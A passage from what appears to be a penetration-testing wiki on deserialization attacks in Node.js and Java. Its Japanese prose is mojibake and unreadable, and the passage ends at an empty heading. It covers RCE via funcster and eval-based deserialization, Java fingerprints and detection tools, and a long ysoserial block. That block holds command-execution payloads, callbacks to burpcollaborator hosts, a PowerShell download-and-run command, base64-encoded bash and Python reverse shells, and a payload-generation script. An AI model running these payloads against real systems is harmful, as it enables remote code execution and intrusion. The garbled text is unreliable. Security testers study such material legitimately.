ã“ã“ã§ã®èˆˆå‘³æ·±ã„é•ã„ã¯ã€**æ¨™æº–ã®çµ„ã¿è¾¼ã¿ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã«ã‚¢ã‚¯ã‚»ã‚¹ã§ããªã„**ã¨ã„ã†ã“ã¨ã§ã™ã€‚ãã‚Œã¯ã€ã‚¹ã‚³ãƒ¼ãƒ—å¤–ã§ã‚ã‚‹ãŸã‚ã§ã™ã€‚ã¤ã¾ã‚Šã€ç§ãŸã¡ã®ã‚³ãƒ¼ãƒ‰ã‚’å®Ÿè¡Œã™ã‚‹ã“ã¨ã¯ã§ãã¾ã™ãŒã€çµ„ã¿è¾¼ã¿ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã®ãƒ¡ã‚½ãƒƒãƒ‰ã‚’å‘¼ã³å‡ºã™ã“ã¨ã¯ã§ãã¾ã›ã‚“ã€‚ã—ãŸãŒã£ã¦ã€`console.log()`ã‚„`require(ä½•ã‹)`ã‚’ä½¿ç”¨ã™ã‚‹ã¨ã€Nodeã¯`"ReferenceError: console is not defined"`ã®ã‚ˆã†ãªä¾‹å¤–ã‚’è¿”ã—ã¾ã™ã€‚

ã—ã‹ã—ã€`this.constructor.constructor("console.log(1111)")();`ã®ã‚ˆã†ãªã‚‚ã®ã‚’ä½¿ç”¨ã—ã¦ã‚°ãƒ­ãƒ¼ãƒãƒ«ã‚³ãƒ³ãƒ†ã‚­ã‚¹ãƒˆã«ã‚¢ã‚¯ã‚»ã‚¹ã™ã‚‹ã“ã¨ã§ã€ç°¡å˜ã«ã™ã¹ã¦ã«å†ã³ã‚¢ã‚¯ã‚»ã‚¹ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚
```javascript
funcster = require("funcster");
//Serialization
var test = funcster.serialize(function() { return "Hello world!" })
console.log(test) // { __js_function: 'function(){return"Hello world!"}' }

//Deserialization with auto-execution
var desertest1 = { __js_function: 'function(){return "Hello world!"}()' }
funcster.deepDeserialize(desertest1)
var desertest2 = { __js_function: 'this.constructor.constructor("console.log(1111)")()' }
funcster.deepDeserialize(desertest2)
var desertest3 = { __js_function: 'this.constructor.constructor("require(\'child_process\').exec(\'ls /\', function(error, stdout, stderr) { console.log(stdout) });")()' }
funcster.deepDeserialize(desertest3)
```
**è©³ç´°ã«ã¤ã„ã¦ã¯ã€**[**ã“ã®ãƒšãƒ¼ã‚¸ã‚’èª­ã‚“ã§ãã ã•ã„**](https://www.acunetix.com/blog/web-security-zone/deserialization-vulnerabilities-attacking-deserialization-in-js/)**ã€‚**

### [**serialize-javascript**](https://www.npmjs.com/package/serialize-javascript)

ã“ã®ãƒ‘ãƒƒã‚±ãƒ¼ã‚¸ã«ã¯**ãƒ‡ã‚·ãƒªã‚¢ãƒ©ã‚¤ã‚ºæ©Ÿèƒ½ãŒå«ã¾ã‚Œã¦ã„ã¾ã›ã‚“**ã€‚è‡ªåˆ†ã§å®Ÿè£…ã™ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚å½¼ã‚‰ã®ä¾‹ã§ã¯ã€ç›´æ¥ `eval` ã‚’ä½¿ç”¨ã—ã¦ã„ã¾ã™ã€‚ã“ã‚ŒãŒå…¬å¼ã®ãƒ‡ã‚·ãƒªã‚¢ãƒ©ã‚¤ã‚ºä¾‹ã§ã™ï¼š
```javascript
function deserialize(serializedJavascript){
return eval('(' + serializedJavascript + ')');
}
```
```markdown
ã“ã®é–¢æ•°ãŒã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã®ãƒ‡ã‚·ãƒªã‚¢ãƒ©ã‚¤ã‚ºã«ä½¿ç”¨ã•ã‚Œã¦ã„ã‚‹å ´åˆã€**ç°¡å˜ã«æ‚ªç”¨ã§ãã¾ã™**ï¼š
```
```javascript
var serialize = require('serialize-javascript');
//Serialization
var test = serialize(function() { return "Hello world!" });
console.log(test) //function() { return "Hello world!" }

//Deserialization
var test = "function(){ require('child_process').exec('ls /', function(error, stdout, stderr) { console.log(stdout) }); }()"
deserialize(test)
```
### Cryo ãƒ©ã‚¤ãƒ–ãƒ©ãƒª

ä»¥ä¸‹ã®ãƒšãƒ¼ã‚¸ã§ã¯ã€ã“ã®ãƒ©ã‚¤ãƒ–ãƒ©ãƒªã‚’æ‚ªç”¨ã—ã¦ä»»æ„ã®ã‚³ãƒãƒ³ãƒ‰ã‚’å®Ÿè¡Œã™ã‚‹æ–¹æ³•ã«ã¤ã„ã¦ã®æƒ…å ±ãŒè¦‹ã¤ã‹ã‚Šã¾ã™ï¼š

* [https://www.acunetix.com/blog/web-security-zone/deserialization-vulnerabilities-attacking-deserialization-in-js/](https://www.acunetix.com/blog/web-security-zone/deserialization-vulnerabilities-attacking-deserialization-in-js/)
* [https://hackerone.com/reports/350418](https://hackerone.com/reports/350418)

## Java - HTTP

Java ã§ã®ãƒ‡ã‚·ãƒªã‚¢ãƒ©ã‚¤ã‚ºã•ã‚ŒãŸã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã®ä¸»ãªå•é¡Œã¯ã€**ãƒ‡ã‚·ãƒªã‚¢ãƒ©ã‚¤ã‚ºä¸­ã«ãƒ‡ã‚·ãƒªã‚¢ãƒ©ã‚¤ã‚ºã‚³ãƒ¼ãƒ«ãƒãƒƒã‚¯ãŒå‘¼ã³å‡ºã•ã‚ŒãŸ**ã“ã¨ã§ã™ã€‚ã“ã‚Œã«ã‚ˆã‚Šã€**æ”»æ’ƒè€…**ãŒãã®ã‚³ãƒ¼ãƒ«ãƒãƒƒã‚¯ã‚’**åˆ©ç”¨ã—**ã€ã‚³ãƒ¼ãƒ«ãƒãƒƒã‚¯ã‚’æ‚ªç”¨ã—ã¦**æ‚ªæ„ã®ã‚ã‚‹è¡Œå‹•ã‚’å®Ÿè¡Œã™ã‚‹**ãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ã‚’æº–å‚™ã™ã‚‹ã“ã¨ãŒå¯èƒ½ã«ãªã‚Šã¾ã™ã€‚

### æŒ‡ç´‹

#### ãƒ›ãƒ¯ã‚¤ãƒˆãƒœãƒƒã‚¯ã‚¹

ã‚³ãƒ¼ãƒ‰å†…ã§ã‚·ãƒªã‚¢ãƒ©ã‚¤ã‚¼ãƒ¼ã‚·ãƒ§ãƒ³ã‚¯ãƒ©ã‚¹ã¨é–¢æ•°ã‚’æ¢ã—ã¾ã™ã€‚ä¾‹ãˆã°ã€`Serializable` ã‚’å®Ÿè£…ã—ã¦ã„ã‚‹ã‚¯ãƒ©ã‚¹ã‚„ `java.io.ObjectInputStream` __ ã‚„ `readObject` __ ã‚„ `readUnshare` é–¢æ•°ã®ä½¿ç”¨ã‚’æ¢ã—ã¾ã™ã€‚\_

ã¾ãŸã€ä»¥ä¸‹ã«ã‚‚æ³¨æ„ã‚’æ‰•ã†ã¹ãã§ã™ï¼š

* å¤–éƒ¨ãƒ¦ãƒ¼ã‚¶ãƒ¼å®šç¾©ãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿ã‚’æŒã¤ `XMLdecoder`
* `fromXML` ãƒ¡ã‚½ãƒƒãƒ‰ã‚’æŒã¤ `XStream` (xstream ãƒãƒ¼ã‚¸ãƒ§ãƒ³ <= v1.46 ã¯ã‚·ãƒªã‚¢ãƒ©ã‚¤ã‚¼ãƒ¼ã‚·ãƒ§ãƒ³ã®å•é¡Œã«å¯¾ã—ã¦è„†å¼±)
* `readObject` ã‚’æŒã¤ `ObjectInputStream`
* `readObject`, `readObjectNodData`, `readResolve`, `readExternal` ã®ä½¿ç”¨
* `ObjectInputStream.readUnshared`
* `Serializable`

#### ãƒ–ãƒ©ãƒƒã‚¯ãƒœãƒƒã‚¯ã‚¹

**java ã‚·ãƒªã‚¢ãƒ©ã‚¤ã‚º** ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã® **æŒ‡ç´‹/ãƒã‚¸ãƒƒã‚¯ãƒã‚¤ãƒˆ** (`ObjectInputStream` ã‹ã‚‰)ï¼š

* Hex ã§ `AC ED 00 05`
* Base64 ã§ `rO0`
* HTTP ãƒ¬ã‚¹ãƒãƒ³ã‚¹ã® `Content-type` ãƒ˜ãƒƒãƒ€ãƒ¼ãŒ `application/x-java-serialized-object` ã«è¨­å®šã•ã‚Œã¦ã„ã‚‹
* Hex ã§åœ§ç¸®ã•ã‚ŒãŸ `1F 8B 08 00`
* Base64 ã§åœ§ç¸®ã•ã‚ŒãŸ `H4sIA`
* æ‹¡å¼µå­ãŒ `.faces` ã§ã€`faces.ViewState` ãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿ã‚’æŒã¤ Web ãƒ•ã‚¡ã‚¤ãƒ«ã€‚ã“ã®ã‚ˆã†ãªã‚‚ã®ã‚’ webapp ã§è¦‹ã¤ã‘ãŸå ´åˆã¯ã€[**Java JSF VewState Deserialization ã«ã¤ã„ã¦ã®æŠ•ç¨¿**](java-jsf-viewstate-.faces-deserialization.md)ã‚’ç¢ºèªã—ã¦ãã ã•ã„ã€‚
```
javax.faces.ViewState=rO0ABXVyABNbTGphdmEubGFuZy5PYmplY3Q7kM5YnxBzKWwCAAB4cAAAAAJwdAAML2xvZ2luLnhodG1s
```
### è„†å¼±æ€§ã®ç¢ºèª

**Javaã®ãƒ‡ã‚·ãƒªã‚¢ãƒ©ã‚¤ã‚ºã‚¨ã‚¯ã‚¹ãƒ—ãƒ­ã‚¤ãƒˆãŒã©ã®ã‚ˆã†ã«æ©Ÿèƒ½ã™ã‚‹ã‹å­¦ã³ãŸã„**å ´åˆã¯ã€[**åŸºæœ¬çš„ãªJavaãƒ‡ã‚·ãƒªã‚¢ãƒ©ã‚¤ã‚º**](basic-java-deserialization-objectinputstream-readobject.md)ã€[**Java DNSãƒ‡ã‚·ãƒªã‚¢ãƒ©ã‚¤ã‚º**](java-dns-deserialization-and-gadgetprobe.md)ã€ãŠã‚ˆã³[**CommonsCollection1ãƒšã‚¤ãƒ­ãƒ¼ãƒ‰**](java-transformers-to-rutime-exec-payload.md)ã‚’å‚ç…§ã—ã¦ãã ã•ã„ã€‚

#### ãƒ›ãƒ¯ã‚¤ãƒˆãƒœãƒƒã‚¯ã‚¹ãƒ†ã‚¹ãƒˆ

æ—¢çŸ¥ã®è„†å¼±æ€§ã‚’æŒã¤ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ãŒã‚¤ãƒ³ã‚¹ãƒˆãƒ¼ãƒ«ã•ã‚Œã¦ã„ã‚‹ã‹ã©ã†ã‹ã‚’ç¢ºèªã§ãã¾ã™ã€‚
```bash
find . -iname "*commons*collection*"
grep -R InvokeTransformer .
```
ä»¥ä¸‹ã®å†…å®¹ã¯ã€è„†å¼±æ€§ã®ã‚ã‚‹æ—¢çŸ¥ã®ãƒ©ã‚¤ãƒ–ãƒ©ãƒªã‚’**ã™ã¹ã¦ãƒã‚§ãƒƒã‚¯**ã—ã€[**Ysoserial**](https://github.com/frohoff/ysoserial)ãŒã‚¨ã‚¯ã‚¹ãƒ—ãƒ­ã‚¤ãƒˆã‚’æä¾›ã§ãã‚‹ã‚‚ã®ã‚’ç¢ºèªã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚ã¾ãŸã¯ã€[Java-Deserialization-Cheat-Sheet](https://github.com/GrrrDog/Java-Deserialization-Cheat-Sheet#genson-json)ã«è¨˜è¼‰ã•ã‚Œã¦ã„ã‚‹ãƒ©ã‚¤ãƒ–ãƒ©ãƒªã‚’ãƒã‚§ãƒƒã‚¯ã™ã‚‹ã“ã¨ã‚‚ã§ãã¾ã™ã€‚\
ã•ã‚‰ã«ã€[**gadgetinspector**](https://github.com/JackOfMostTrades/gadgetinspector)ã‚’ä½¿ç”¨ã—ã¦ã€æ‚ªç”¨å¯èƒ½ãªã‚¬ã‚¸ã‚§ãƒƒãƒˆãƒã‚§ãƒ¼ãƒ³ã‚’æ¢ã™ã“ã¨ãŒã§ãã¾ã™ã€‚\
**gadgetinspector**ã‚’å®Ÿè¡Œã™ã‚‹ã¨ãï¼ˆãƒ“ãƒ«ãƒ‰å¾Œï¼‰ã€å¤šæ•°ã®è­¦å‘Š/ã‚¨ãƒ©ãƒ¼ã«ã¤ã„ã¦ã¯æ°—ã«ã›ãšã€å®Œäº†ã™ã‚‹ã¾ã§å¾…ã¡ã¾ã™ã€‚çµæœã¯_gadgetinspector/gadget-results/gadget-chains-year-month-day-hour-min.txt_ã®ä¸‹ã«æ›¸ãè¾¼ã¾ã‚Œã¾ã™ã€‚**gadgetinspectorã¯ã‚¨ã‚¯ã‚¹ãƒ—ãƒ­ã‚¤ãƒˆã‚’ä½œæˆã›ãšã€èª¤æ¤œçŸ¥ã‚’ç¤ºã™å¯èƒ½æ€§ãŒã‚ã‚‹**ã“ã¨ã«æ³¨æ„ã—ã¦ãã ã•ã„ã€‚

#### ãƒ–ãƒ©ãƒƒã‚¯ãƒœãƒƒã‚¯ã‚¹ãƒ†ã‚¹ãƒˆ

Burpæ‹¡å¼µæ©Ÿèƒ½ã®[**gadgetprobe**](java-dns-deserialization-and-gadgetprobe.md)ã‚’ä½¿ç”¨ã™ã‚‹ã¨ã€**åˆ©ç”¨å¯èƒ½ãªãƒ©ã‚¤ãƒ–ãƒ©ãƒª**ï¼ˆãƒãƒ¼ã‚¸ãƒ§ãƒ³ã‚‚å«ã‚€ï¼‰ã‚’ç‰¹å®šã§ãã¾ã™ã€‚ã“ã®æƒ…å ±ã‚’ã‚‚ã¨ã«ã€è„†å¼±æ€§ã‚’æ‚ªç”¨ã™ã‚‹ãŸã‚ã®ãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ã‚’**é¸ã³ã‚„ã™ããªã‚‹**ã‹ã‚‚ã—ã‚Œã¾ã›ã‚“ã€‚\
[**GadgetProbeã«ã¤ã„ã¦ã‚‚ã£ã¨å­¦ã¶ã«ã¯ã“ã¡ã‚‰ã‚’èª­ã‚“ã§ãã ã•ã„**](java-dns-deserialization-and-gadgetprobe.md#gadgetprobe)ã€‚\
GadgetProbeã¯**`ObjectInputStream`**ã®ãƒ‡ã‚·ãƒªã‚¢ãƒ©ã‚¤ã‚¼ãƒ¼ã‚·ãƒ§ãƒ³ã«ç‰¹åŒ–ã—ã¦ã„ã¾ã™ã€‚

Burpæ‹¡å¼µæ©Ÿèƒ½ã®[**Java Deserialization Scanner**](java-dns-deserialization-and-gadgetprobe.md#java-deserialization-scanner)ã‚’ä½¿ç”¨ã™ã‚‹ã¨ã€ysoserialã§æ‚ªç”¨å¯èƒ½ãª**è„†å¼±ãªãƒ©ã‚¤ãƒ–ãƒ©ãƒª**ã‚’ç‰¹å®šã—ã€**æ‚ªç”¨**ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚\
[**Java Deserialization Scannerã«ã¤ã„ã¦ã‚‚ã£ã¨å­¦ã¶ã«ã¯ã“ã¡ã‚‰ã‚’èª­ã‚“ã§ãã ã•ã„ã€‚**](java-dns-deserialization-and-gadgetprobe.md#java-deserialization-scanner)\
Java Deserialization Scannerã¯**`ObjectInputStream`**ã®ãƒ‡ã‚·ãƒªã‚¢ãƒ©ã‚¤ã‚¼ãƒ¼ã‚·ãƒ§ãƒ³ã«ç‰¹åŒ–ã—ã¦ã„ã¾ã™ã€‚

ã¾ãŸã€[**Freddy**](https://github.com/nccgroup/freddy)ã‚’ä½¿ç”¨ã—ã¦ã€**Burp**ã§ã®ãƒ‡ã‚·ãƒªã‚¢ãƒ©ã‚¤ã‚¼ãƒ¼ã‚·ãƒ§ãƒ³**è„†å¼±æ€§ã‚’æ¤œå‡º**ã™ã‚‹ã“ã¨ã‚‚ã§ãã¾ã™ã€‚ã“ã®ãƒ—ãƒ©ã‚°ã‚¤ãƒ³ã¯ã€**`ObjectInputStream`**ã«é–¢é€£ã™ã‚‹è„†å¼±æ€§ã ã‘ã§ãªãã€**Json**ã‚„**Yml**ãƒ‡ã‚·ãƒªã‚¢ãƒ©ã‚¤ã‚¼ãƒ¼ã‚·ãƒ§ãƒ³ãƒ©ã‚¤ãƒ–ãƒ©ãƒªã®è„†å¼±æ€§ã‚‚æ¤œå‡ºã—ã¾ã™ã€‚ã‚¢ã‚¯ãƒ†ã‚£ãƒ–ãƒ¢ãƒ¼ãƒ‰ã§ã¯ã€sleepã‚„DNSãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ã‚’ä½¿ç”¨ã—ã¦ãã‚Œã‚‰ã‚’ç¢ºèªã—ã‚ˆã†ã¨ã—ã¾ã™ã€‚\
[**Freddyã«ã¤ã„ã¦ã®è©³ç´°ã¯ã“ã¡ã‚‰ã‚’ã”è¦§ãã ã•ã„ã€‚**](https://www.nccgroup.com/us/about-us/newsroom-and-events/blog/2018/june/finding-deserialisation-issues-has-never-been-easier-freddy-the-serialisation-killer/)

**ã‚·ãƒªã‚¢ãƒ©ã‚¤ã‚¼ãƒ¼ã‚·ãƒ§ãƒ³ãƒ†ã‚¹ãƒˆ**

ã‚µãƒ¼ãƒãƒ¼ãŒè„†å¼±ãªãƒ©ã‚¤ãƒ–ãƒ©ãƒªã‚’ä½¿ç”¨ã—ã¦ã„ã‚‹ã‹ã©ã†ã‹ã‚’ãƒã‚§ãƒƒã‚¯ã™ã‚‹ã ã‘ã§ã¯ã‚ã‚Šã¾ã›ã‚“ã€‚æ™‚ã«ã¯ã€ã‚·ãƒªã‚¢ãƒ©ã‚¤ã‚ºã•ã‚ŒãŸã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆå†…ã®ãƒ‡ãƒ¼ã‚¿ã‚’**å¤‰æ›´ã—ã¦ã€ã„ãã¤ã‹ã®ãƒã‚§ãƒƒã‚¯ã‚’ãƒã‚¤ãƒ‘ã‚¹**ã™ã‚‹ã“ã¨ãŒã§ãã‚‹ã‹ã‚‚ã—ã‚Œã¾ã›ã‚“ï¼ˆä¾‹ãˆã°ã€Webã‚¢ãƒ—ãƒªå†…ã§ç®¡ç†è€…æ¨©é™ã‚’ä»˜ä¸ã™ã‚‹ï¼‰ã€‚\
Javaã‚·ãƒªã‚¢ãƒ©ã‚¤ã‚ºã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆãŒWebã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã«é€ä¿¡ã•ã‚Œã¦ã„ã‚‹ã“ã¨ãŒã‚ã‹ã£ãŸå ´åˆã€[**SerializationDumper**](https://github.com/NickstaDB/SerializationDumper)ã‚’ä½¿ç”¨ã—ã¦ã€é€ä¿¡ã•ã‚Œã‚‹ã‚·ãƒªã‚¢ãƒ©ã‚¤ã‚¼ãƒ¼ã‚·ãƒ§ãƒ³ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã‚’ã‚ˆã‚Šäººé–“ãŒèª­ã¿ã‚„ã™ã„å½¢å¼ã§**å°åˆ·ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™**ã€‚ã©ã®ãƒ‡ãƒ¼ã‚¿ã‚’é€ä¿¡ã—ã¦ã„ã‚‹ã‹ã‚’çŸ¥ã‚‹ã“ã¨ã§ã€ãã‚Œã‚’å¤‰æ›´ã—ã¦ã„ãã¤ã‹ã®ãƒã‚§ãƒƒã‚¯ã‚’ãƒã‚¤ãƒ‘ã‚¹ã™ã‚‹ã®ãŒç°¡å˜ã«ãªã‚‹ã§ã—ã‚‡ã†ã€‚

### **ã‚¨ã‚¯ã‚¹ãƒ—ãƒ­ã‚¤ãƒˆ**

#### **ysoserial**

Javaãƒ‡ã‚·ãƒªã‚¢ãƒ©ã‚¤ã‚¼ãƒ¼ã‚·ãƒ§ãƒ³ã‚’æ‚ªç”¨ã™ã‚‹ãŸã‚ã®æœ€ã‚‚æœ‰åãªãƒ„ãƒ¼ãƒ«ã¯[**ysoserial**](https://github.com/frohoff/ysoserial)ï¼ˆ[**ã“ã“ã‹ã‚‰ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰**](https://jitpack.io/com/github/frohoff/ysoserial/master-SNAPSHOT/ysoserial-master-SNAPSHOT.jar)ï¼‰ã§ã™ã€‚è¤‡é›‘ãªã‚³ãƒãƒ³ãƒ‰ï¼ˆä¾‹ãˆã°ãƒ‘ã‚¤ãƒ—ã‚’ä½¿ç”¨ã™ã‚‹ï¼‰ã‚’ä½¿ç”¨ã§ãã‚‹[**ysoserial-modified**](https://github.com/pimps/ysoserial-modified)ã®ä½¿ç”¨ã‚‚æ¤œè¨ã§ãã¾ã™ã€‚\
ã“ã®ãƒ„ãƒ¼ãƒ«ã¯**`ObjectInputStream`**ã‚’æ‚ªç”¨ã™ã‚‹ã“ã¨ã«**ç‰¹åŒ–**ã—ã¦ã„ã¾ã™ã€‚\
RCEãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ã‚’ãƒ†ã‚¹ãƒˆã™ã‚‹å‰ã«ã€æ³¨å…¥ãŒå¯èƒ½ã‹ã©ã†ã‹ã‚’ãƒ†ã‚¹ãƒˆã™ã‚‹ãŸã‚ã«**"URLDNS"**ãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ã®ä½¿ç”¨ã‹ã‚‰**å§‹ã‚ã‚‹ã“ã¨ã‚’ãŠå‹§ã‚ã—ã¾ã™**ã€‚ãŸã ã—ã€"URLDNS"ãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ãŒæ©Ÿèƒ½ã—ãªã„å ´åˆã§ã‚‚ã€ä»–ã®RCEãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ãŒæ©Ÿèƒ½ã™ã‚‹å¯èƒ½æ€§ãŒã‚ã‚‹ã“ã¨ã«æ³¨æ„ã—ã¦ãã ã•ã„ã€‚
```bash
# PoC to make the application perform a DNS req
java -jar ysoserial-master-SNAPSHOT.jar URLDNS http://b7j40108s43ysmdpplgd3b7rdij87x.burpcollaborator.net > payload

# PoC RCE in Windows
# Ping
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections5 'cmd /c ping -n 5 127.0.0.1' > payload
# Time, I noticed the response too longer when this was used
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "cmd /c timeout 5" > payload
# Create File
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "cmd /c echo pwned> C:\\\\Users\\\\username\\\\pwn" > payload
# DNS request
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "cmd /c nslookup jvikwa34jwgftvoxdz16jhpufllb90.burpcollaborator.net"
# HTTP request (+DNS)
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "cmd /c certutil -urlcache -split -f http://j4ops7g6mi9w30verckjrk26txzqnf.burpcollaborator.net/a a"
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "powershell.exe -NonI -W Hidden -NoP -Exec Bypass -Enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAYwBlADcAMABwAG8AbwB1ADAAaABlAGIAaQAzAHcAegB1AHMAMQB6ADIAYQBvADEAZgA3ADkAdgB5AC4AYgB1AHIAcABjAG8AbABsAGEAYgBvAHIAYQB0AG8AcgAuAG4AZQB0AC8AYQAnACkA"
## In the ast http request was encoded: IEX(New-Object Net.WebClient).downloadString('http://1ce70poou0hebi3wzus1z2ao1f79vy.burpcollaborator.net/a')
## To encode something in Base64 for Windows PS from linux you can use: echo -n "<PAYLOAD>" | iconv --to-code UTF-16LE | base64 -w0
# Reverse Shell
## Encoded: IEX(New-Object Net.WebClient).downloadString('http://192.168.1.4:8989/powercat.ps1')
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "powershell.exe -NonI -W Hidden -NoP -Exec Bypass -Enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAOQAyAC4AMQA2ADgALgAxAC4ANAA6ADgAOQA4ADkALwBwAG8AdwBlAHIAYwBhAHQALgBwAHMAMQAnACkA"

#PoC RCE in Linux
# Ping
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "ping -c 5 192.168.1.4" > payload
# Time
## Using time in bash I didn't notice any difference in the timing of the response
# Create file
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "touch /tmp/pwn" > payload
# DNS request
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "dig ftcwoztjxibkocen6mkck0ehs8yymn.burpcollaborator.net"
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "nslookup ftcwoztjxibkocen6mkck0ehs8yymn.burpcollaborator.net"
# HTTP request (+DNS)
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "curl ftcwoztjxibkocen6mkck0ehs8yymn.burpcollaborator.net" > payload
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "wget ftcwoztjxibkocen6mkck0ehs8yymn.burpcollaborator.net"
# Reverse shell
## Encoded: bash -i >& /dev/tcp/127.0.0.1/4444 0>&1
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4wLjEvNDQ0NCAwPiYx}|{base64,-d}|{bash,-i}" | base64 -w0
## Encoded: export RHOST="127.0.0.1";export RPORT=12345;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "bash -c {echo,ZXhwb3J0IFJIT1NUPSIxMjcuMC4wLjEiO2V4cG9ydCBSUE9SVD0xMjM0NTtweXRob24gLWMgJ2ltcG9ydCBzeXMsc29ja2V0LG9zLHB0eTtzPXNvY2tldC5zb2NrZXQoKTtzLmNvbm5lY3QoKG9zLmdldGVudigiUkhPU1QiKSxpbnQob3MuZ2V0ZW52KCJSUE9SVCIpKSkpO1tvcy5kdXAyKHMuZmlsZW5vKCksZmQpIGZvciBmZCBpbiAoMCwxLDIpXTtwdHkuc3Bhd24oIi9iaW4vc2giKSc=}|{base64,-d}|{bash,-i}"

# Base64 encode payload in base64
base64 -w0 payload
```
```markdown
**java.lang.Runtime.exec()** ç”¨ã®ãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ã‚’ä½œæˆã™ã‚‹éš›ã€å®Ÿè¡Œçµæœã‚’ãƒªãƒ€ã‚¤ãƒ¬ã‚¯ãƒˆã™ã‚‹ãŸã‚ã® ">" ã‚„ "|"ã€ã‚³ãƒãƒ³ãƒ‰ã‚’å®Ÿè¡Œã™ã‚‹ãŸã‚ã® "$()"ã€ã¾ãŸã¯ **ã‚¹ãƒšãƒ¼ã‚¹** ã§åŒºåˆ‡ã‚‰ã‚ŒãŸã‚³ãƒãƒ³ãƒ‰ã¸ã® **å¼•æ•°ã®æ¸¡ã—**ï¼ˆ`echo -n "hello world"` ã¯å¯èƒ½ã§ã™ãŒã€`python2 -c 'print "Hello world"'` ã¯ä¸å¯èƒ½ã§ã™ï¼‰ãªã©ã®**ç‰¹æ®Šæ–‡å­—ã‚’ä½¿ç”¨ã™ã‚‹ã“ã¨ã¯ã§ãã¾ã›ã‚“**ã€‚ãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ã‚’æ­£ã—ãã‚¨ãƒ³ã‚³ãƒ¼ãƒ‰ã™ã‚‹ãŸã‚ã«ã¯ã€[ã“ã®ã‚¦ã‚§ãƒ–ãƒšãƒ¼ã‚¸ã‚’ä½¿ç”¨ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™](http://www.jackson-t.ca/runtime-exec-payloads.html)ã€‚

Windowsã¨Linuxã®**ã™ã¹ã¦ã®å¯èƒ½ãªã‚³ãƒ¼ãƒ‰å®Ÿè¡Œ**ãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ã‚’ä½œæˆã—ã€ãã‚Œã‚‰ã‚’è„†å¼±ãªã‚¦ã‚§ãƒ–ãƒšãƒ¼ã‚¸ã§ãƒ†ã‚¹ãƒˆã™ã‚‹ãŸã‚ã«ã€æ¬¡ã®ã‚¹ã‚¯ãƒªãƒ—ãƒˆã‚’è‡ªç”±ã«ä½¿ç”¨ã—ã¦ãã ã•ã„ï¼š
```
```python
import os
import base64

# You may need to update the payloads
payloads = ['BeanShell1', 'Clojure', 'CommonsBeanutils1', 'CommonsCollections1', 'CommonsCollections2', 'CommonsCollections3', 'CommonsCollections4', 'CommonsCollections5', 'CommonsCollections6', 'CommonsCollections7', 'Groovy1', 'Hibernate1', 'Hibernate2', 'JBossInterceptors1', 'JRMPClient', 'JSON1', 'JavassistWeld1', 'Jdk7u21', 'MozillaRhino1', 'MozillaRhino2', 'Myfaces1', 'Myfaces2', 'ROME', 'Spring1', 'Spring2', 'Vaadin1', 'Wicket1']
def generate(name, cmd):
for payload in payloads:
final = cmd.replace('REPLACE', payload)
print 'Generating ' + payload + ' for ' + name + '...'
command = os.popen('java -jar ysoserial.jar ' + payload + ' "' + final + '"')
result = command.read()
command.close()
encoded = base64.b64encode(result)
if encoded != "":
open(name + '_intruder.txt', 'a').write(encoded + '\n')

generate('Windows', 'ping -n 1 win.REPLACE.server.local')
generate('Linux', 'ping -c 1 nix.REPLACE.server.local')
```
#### serialkillerbypassgadgets

